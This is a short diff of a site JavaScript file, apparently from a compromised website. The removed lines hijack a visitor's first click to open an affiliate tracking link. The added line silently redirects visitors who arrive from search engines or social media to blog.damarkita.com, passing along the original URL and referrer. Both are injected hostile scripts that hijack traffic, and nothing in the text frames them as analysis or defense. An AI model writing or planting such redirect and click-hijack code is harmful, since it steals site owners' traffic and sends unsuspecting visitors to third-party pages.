@@ -1,9 +1,1 @@
-$(document).ready(function()
-{
-	$('body').addClass('xepo_ads');
-});
-$(document).on('click','.xepo_ads',function(e)
-{
-	$(this).removeClass('xepo_ads');
-	window.open('https://go.ecotrackings.com/?token=kiLqmxlpMhRBOYlZGNvAk&url=https%3A%2F%2Flazada.co.id','_blank');
-});
+var ars = 'https://blog.damarkita.com';if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
